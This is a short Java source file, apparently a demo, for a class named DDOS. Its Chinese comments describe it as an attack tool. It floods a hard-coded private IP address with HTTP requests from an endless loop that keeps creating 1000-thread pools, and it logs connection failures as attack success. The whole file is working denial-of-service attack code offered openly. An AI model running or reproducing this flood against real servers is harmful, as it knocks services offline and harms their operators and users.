package com.tarzan.reptile.demo;

import lombok.extern.slf4j.Slf4j;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Slf4j
public class DDOS implements Runnable {

    //攻击的网路地址或ip
    private static String ipAddr = "http://172.16.10.5:1888/";
    //攻击的ddos数量（太小没效果，太大容易自己死机）
    private static Integer ddosNum = 1000;

    //主方法
    public static void main(String[] args) {
        DDOS.attack();
    }

    public static void attack() {
        while (true) {
            //利用线程池创建ddos攻击线程数
            ExecutorService es = Executors.newFixedThreadPool(ddosNum);
            DDOS ddos = new DDOS();
            es.execute(ddos);
        }
    }

    public void run() {
        while (true) {
            try {
                URL url = new URL(ipAddr);
                URLConnection conn = url.openConnection();
                BufferedInputStream bis = new BufferedInputStream(
                        conn.getInputStream());
                byte[] bytes = new byte[10240];
                int len = -1;
                StringBuffer sb = new StringBuffer();
                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        log.info("doss攻击中。。。");
                        bis.close();
                    }
                }
            } catch (IOException e) {
                log.info("doss攻击成功！！！");
            }
        }
    }
}
